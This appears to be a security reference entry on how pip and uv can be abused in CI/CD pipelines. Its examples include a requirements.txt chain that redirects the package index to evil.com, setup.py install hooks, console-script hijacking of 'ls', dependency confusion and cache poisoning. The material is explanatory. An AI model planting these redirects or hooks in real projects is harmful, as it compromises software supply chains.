---
title: pip
tags:
- cli
- input-file
- eval-py
- env-var
references:
- https://pip.pypa.io/en/stable/cli/pip_install/
- https://pip.pypa.io/en/stable/topics/secure-installs/
- https://pip.pypa.io/en/stable/reference/build-system/
files: [requirements.txt, constraints.txt, setup.py, pyproject.toml]
---

`pip` is the standard package installer for Python.

# `requirements.txt`

When a workflow executes `pip install -r requirements.txt`, it will use the directives within that file. 

An attacker can add a malicious package that they host on Pypi to `requirements.txt`. 

`--index-url` or `-i`: An attacker can set a malicious package index directly in `requirements.txt`. Those flags allow to overwrite the standard Pypi registry with an attacker-controlled registry.

These flags in `requirements.txt` take the highest priority over environment variables and `pip.conf` or `pip.ini`. Only a flag in the command (eg. *`pip install -r requirements.txt -i https://blabla.com`*) will take priority over them. 
If several flags `-i` are present in `requirements.txt`, the last one will be applied. 


An attacker can use `-r {file_name}` to **recursively include** the content of `file_name` in `requirements.txt`.

```py
# 'requirements.txt' file
pandas
numpy==1.26.4
-r -
```
```py
# '-' file
-i https://evil.com/
```

 In just 3 characters, the file `-` can redirect the index for all packages in the file.

# Local Package Installation
A requirements.txt file can point to a local directory. This makes the runner download an attacker-controlled package. 

```toml
# 'requirements.txt' file 
./path/to/malicious_local_package
```

# `constraints.txt`
A constraints file `constraints.txt` can specify package versions and index url using the flags `--index-url` or `-i`. `constraints.txt` is only used by pip when explicitly called in the command: `pip install -r requirements.txt -c constraints.txt`. It allows to overwrite the standard Pypi registry with an attacker-controlled registry. 

If there is also --index-url specified in `requirements.txt.`, the one in `constraints.txt` will be overridden by one in requirements.txt.

# `setup.py`
`setup.py` is automatically called by `pip` when it installs a local package with `pip install ./package_name`, a local package in `requirements.txt` or uses `pip install .`.  

`setup.py` can define post-install scripts that are automatically run after installation with `pip install`. This leads to python code execution. 

```py
# 'setup.py' file

from setuptools.command.install import install
class CustomInstallCommand(install):
    def run(self):
        # malicious code 
        ...

setup(
    name='malicious',
    version='0.1.0',
    cmdclass={
        'install': CustomInstallCommand,
    },
)
```

# Command hijacking

`pyproject.toml` or `setup.py` is automatically called by `pip` when it installs a local package with `pip install ./package_name`, local package in `requirements.txt` or `pip install .`.  

`pyproject.toml` and `setup.py` can define scripts that are added to the environment's PATH. This can be used to override legitimate commands used later in a workflow, as local paths are often prioritized. This attack works even for wheel (.whl) distributions where setup.py is not executed at install time.

Scripts in `pyproject.toml` can be defined under [project.scripts]. In `setup.py`, they can be defined in entry_points.console_scripts. 
```py
# 'setup.py' file 

setup(
    ...
    entry_points={
        'console_scripts': [
            'ls' = malicious_ls:main',
        ],
    },
)
```

```toml
# 'pyproject.toml' file

[build-system]
...

[project]
...

[project.scripts]
ls = "malicious_ls:main"
```
Here an attacker defined a malicious `main` function in `malicious_ls.py` to replace the `ls` command. Every time `ls` will be used, the attacker's script will run instead of the legitime `ls`. 

# Extra index url
The attacks described above that use `-index-url` can also be applied to `--extra-index-url`. This flag adds another index registry, which is used in parallel with the one defined in the index URL (Pypi by default). There is no priority between the two; the most recent version takes precedence. If the same version is found in both, pip chooses one or the other pseudo-randomly. Consequently, an attacker could launch a dependency confusion attack. 

# Cache Poisoning
The attacks described present a significant threat in CI/CD environments that share a dependency cache between workflows. Once a package is downloaded, it is stored in the cache. This cache can be shared between runners for optimisation purposes.  

If non-vulnerable CI runners retrieve dependencies from a shared cache without verifying their hash against the legitimate index (Pypi) — which they do not and cannot do — they will use the attacker's poisoned version.

A single vulnerable workflow can thereby compromise other, unrelated workflows that share its cache.

# uv
`uv` is a Python package installer and resolver. 

The LOTPs defined for pip also apply to `uv` with `uv pip install`. 